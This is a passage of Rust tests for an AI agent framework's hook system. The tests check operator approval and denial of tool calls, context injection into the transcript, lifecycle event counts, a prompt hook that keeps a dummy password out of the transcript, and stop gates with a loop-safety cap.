                id: "tc-hook-ask".into(),
                name: "read_file".into(),
                arguments_json: serde_json::json!({"path":"original.txt"}).to_string(),
            })
            .await
    });
    let expected_args = serde_json::json!({"path": file.path().to_string_lossy()});
    loop {
        match tokio::time::timeout(std::time::Duration::from_secs(5), subscription.recv())
            .await
            .unwrap()
        {
            crate::conduit::ConduitReceive::Event(ProtocolEvent::ToolApprovalRequested {
                call,
                ..
            }) => {
                // Approval binds the post-mutation payload, not the original.
                assert_eq!(call.arguments_json, expected_args.to_string());
                let sender = approvals.lock().unwrap().remove(&call.id).unwrap();
                sender.send(true).unwrap();
                break;
            }
            crate::conduit::ConduitReceive::Event(_) => {}
            crate::conduit::ConduitReceive::Lagged { .. } => continue,
            crate::conduit::ConduitReceive::Closed => panic!("conduit closed before approval"),
        }
    }
    let result = task.await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(!result.is_error, "approved ask should execute: {result:?}");
    assert!(result.content.contains("ask payload"));
}

#[tokio::test]
async fn hook_ask_denied_by_operator_does_not_execute() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), "never read").unwrap();
    let conduit = Arc::new(Conduit::new(64));
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        conduit.clone(),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            workspace_root: file.path().parent().unwrap().to_path_buf(),
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "decision": "ask", "reason": "confirm read"
    })));
    let approvals = engine.pending_approvals.clone();
    let mut subscription = conduit.subscribe_human();
    let path = file.path().to_string_lossy().to_string();
    let task = tokio::spawn(async move {
        engine
            .dispatch_external_tool_call(ToolCall {
                id: "tc-hook-ask-deny".into(),
                name: "read_file".into(),
                arguments_json: serde_json::json!({"path": path}).to_string(),
            })
            .await
    });
    loop {
        match tokio::time::timeout(std::time::Duration::from_secs(5), subscription.recv())
            .await
            .unwrap()
        {
            crate::conduit::ConduitReceive::Event(ProtocolEvent::ToolApprovalRequested {
                call,
                ..
            }) => {
                let sender = approvals.lock().unwrap().remove(&call.id).unwrap();
                sender.send(false).unwrap();
                break;
            }
            crate::conduit::ConduitReceive::Event(_) => {}
            crate::conduit::ConduitReceive::Lagged { .. } => continue,
            crate::conduit::ConduitReceive::Closed => panic!("conduit closed before approval"),
        }
    }
    let result = task.await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(result.is_error, "denied ask must not execute");
    assert!(!result.content.contains("never read"));
}

#[tokio::test]
async fn hook_additional_context_reaches_the_model() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let file = tempfile::NamedTempFile::new().unwrap();
    std::fs::write(file.path(), "payload").unwrap();
    let mut engine = SessionEngine::new(
        Arc::new(ScriptedLlm::new(vec![])),
        Arc::new(ToolRegistry::build_default()),
        Arc::new(Conduit::new(64)),
        SessionEngineConfig {
            permission_mode: PermissionMode::Bypass,
            workspace_root: file.path().parent().unwrap().to_path_buf(),
            ..Default::default()
        },
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "additionalContext": "remember the migration plan"
    })));
    let result = engine
        .dispatch_external_tool_call(ToolCall {
            id: "tc-hook-context".into(),
            name: "read_file".into(),
            arguments_json: serde_json::json!({"path": file.path().to_string_lossy()}).to_string(),
        })
        .await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(!result.is_error, "{result:?}");
    assert!(transcript_json(&engine)
        .contains("[Hook context: PreToolUse read_file] remember the migration plan"));
}

#[tokio::test]
async fn lifecycle_events_publish_once_per_session_and_per_run() {
    let _guard = eff002_hook_env_guard().await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    let (mut engine, _c) = engine_with(
        vec![LlmResponse::text("a"), LlmResponse::text("b")],
        PermissionMode::Bypass,
    );
    let bus = rightkit_hooks::agent_hooks::HookBus::new(64);
    let mut sub = bus.subscribe();
    engine.hook_bus = Some(bus);
    engine.submit_user_message("one").await.unwrap();
    engine.submit_user_message("two").await.unwrap();
    let mut names = Vec::new();
    while let Ok(Some(event)) =
        tokio::time::timeout(std::time::Duration::from_millis(50), sub.recv()).await
    {
        names.push(event.name());
    }
    assert_eq!(names.iter().filter(|n| **n == "SessionStart").count(), 1);
    assert_eq!(
        names.iter().filter(|n| **n == "UserPromptSubmit").count(),
        2
    );
    assert!(names.iter().filter(|n| **n == "SessionEnd").count() >= 2);
    assert!(names.contains(&"Notification"));
    assert!(names.contains(&"Stop"));
}

#[tokio::test]
async fn session_start_hook_context_is_injected_once() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"SessionStart":[{"command":"ctx"}]}"#,
    );
    let (mut engine, _c) = engine_with(
        vec![LlmResponse::text("a"), LlmResponse::text("b")],
        PermissionMode::Bypass,
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "additionalContext": "project rules loaded"
    })));
    engine.submit_user_message("one").await.unwrap();
    engine.submit_user_message("two").await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    let transcript = transcript_json(&engine);
    assert_eq!(
        transcript
            .matches("[Hook context: SessionStart] project rules loaded")
            .count(),
        1
    );
}

#[tokio::test]
async fn user_prompt_submit_hook_can_block_the_prompt() {
    let _guard = eff002_hook_env_guard().await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"UserPromptSubmit":[{"command":"gate"}]}"#,
    );
    let (mut engine, _c) = engine_with(vec![], PermissionMode::Bypass);
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "decision": "block", "reason": "no secrets in prompts"
    })));
    let out = engine
        .submit_user_message("my password is hunter2")
        .await
        .unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(out.contains("no secrets in prompts"), "{out}");
    assert!(
        !transcript_json(&engine).contains("hunter2"),
        "blocked prompt must not enter the transcript"
    );
}

#[tokio::test]
async fn user_prompt_submit_additional_context_extends_the_prompt() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"UserPromptSubmit":[{"command":"ctx"}]}"#,
    );
    let (mut engine, _c) = engine_with(vec![LlmResponse::text("ok")], PermissionMode::Bypass);
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "additionalContext": "current branch is main"
    })));
    engine.submit_user_message("what branch?").await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    let transcript = transcript_json(&engine);
    assert!(transcript.contains("what branch?"));
    assert!(transcript.contains("[Hook context: UserPromptSubmit]"));
    assert!(transcript.contains("current branch is main"));
}

#[tokio::test]
async fn notification_hook_context_is_forwarded() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"Notification":[{"command":"note"}]}"#,
    );
    let (mut engine, _c) = engine_with(vec![LlmResponse::text("done")], PermissionMode::Bypass);
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "additionalContext": "notified"
    })));
    engine.submit_user_message("go").await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(transcript_json(&engine).contains("[Hook context: Notification] notified"));
}

#[tokio::test]
async fn stop_hook_block_keeps_the_agent_going_with_the_reason() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var("RIGHTKIT_HOOKS_JSON", r#"{"Stop":[{"command":"gate"}]}"#);
    let (mut engine, _c) = engine_with(
        (0..12).map(|_| LlmResponse::text("done")).collect(),
        PermissionMode::Bypass,
    );
    engine.hook_bus = Some(eff002_hook_bus(serde_json::json!({
        "decision": "block", "reason": "tests are still failing"
    })));
    let out = engine.submit_user_message("finish").await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(
        transcript_json(&engine).contains("[Stop gate blocked completion] tests are still failing"),
        "block reason must be fed back to the model"
    );
    // The loop-safety cap still ends a hook that never relents.
    assert!(out.contains("Loop-safety gate override"), "{out}");
}

#[tokio::test]
async fn subagent_stop_hook_block_applies_only_to_subagent_engines() {
    let _guard = eff002_hook_env_guard().await;
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"SubagentStop":[{"command":"gate"}]}"#,
    );
    let block = serde_json::json!({"continue": false, "stopReason": "subagent not finished"});

    let (mut main_engine, _c) =
        engine_with(vec![LlmResponse::text("done")], PermissionMode::Bypass);
    main_engine.hook_bus = Some(eff002_hook_bus(block.clone()));
    let main_out = main_engine.submit_user_message("go").await.unwrap();
    assert_eq!(
        main_out, "done",
        "main agent is gated by Stop, not SubagentStop"
    );

    let (mut sub_engine, _c) = engine_with(
        (0..12).map(|_| LlmResponse::text("done")).collect(),
        PermissionMode::Bypass,
    );
    sub_engine.set_subagent_role("worker");
    sub_engine.hook_bus = Some(eff002_hook_bus(block));
    sub_engine.submit_user_message("go").await.unwrap();
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(transcript_json(&sub_engine)
        .contains("[Stop gate blocked completion] subagent not finished"));
}

#[tokio::test]
async fn configured_pre_tool_hooks_are_detected_for_serial_routing() {
    let _guard = eff002_hook_env_guard().await;
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    std::env::set_var(
        "RIGHTKIT_HOOKS_JSON",
        r#"{"PreToolUse":[{"command":"fixture"}]}"#,
    );
    let bus = eff002_hook_bus(serde_json::json!({}));
    assert!(bus.has_pre_tool_use_hooks());
    std::env::remove_var("RIGHTKIT_HOOKS_JSON");
    assert!(!bus.has_pre_tool_use_hooks());
}
